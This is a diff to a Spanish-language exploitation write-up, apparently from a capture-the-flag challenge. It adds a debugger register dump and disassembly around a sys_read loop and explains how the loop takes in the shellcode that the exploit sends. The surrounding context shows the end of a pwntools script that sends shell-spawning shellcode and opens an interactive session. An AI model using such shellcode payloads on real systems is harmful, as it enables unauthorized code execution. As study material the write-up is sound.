@@ -358,3 +358,42 @@ sleep(0.5)
 p.sendline(asm(shellcraft.amd64.linux.sh()))
 p.interactive()
 ```
+
+Antes de ejecutar la llamada a sys_read tenemos estos valores:
+
+```
+RAX: 0x0 
+RBX: 0x0 
+RCX: 0x0 
+RDX: 0x64 ('d')
+RSI: 0x7ffff7feadbe 
+RDI: 0x0 
+RBP: 0x0 
+RSP: 0x7fffffffd258 --> 0x0 
+RIP: 0x7ffff7ff3048 --> 0xf7eb050f 
+R8 : 0x0 
+R9 : 0x8285 
+R10: 0x0 
+R11: 0x0 
+R12: 0x0 
+R13: 0x0 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x7ffff7ff303c:	lea    rsi,[rip+0xfffffffffffefaf6]        # 0x7ffff7fe2b39
+   0x7ffff7ff3043:	add    rsi,r9
+   0x7ffff7ff3046:	xor    eax,eax
+=> 0x7ffff7ff3048:	syscall 
+   0x7ffff7ff304a:	jmp    0x7ffff7ff3043
+```
+
+Tenemos: 
+%rax=0 ---> Código de la llamada sys_read
+%rdi=0 ---> Unsigned int fd (0 is stdin, 1 is stdout and 2 is stderr)
+$rsi=0x7ffff7feadbe ---> char \*buf
+$rdx=0x64 ---> size_t count
+
+Lo que está haciendo es un bucle para leer por consola lo que le enviemos, lo guarda en el bufer de 0x64 en 0x64 bytes Si nos fijamos en el python le envía una shell.
+
+
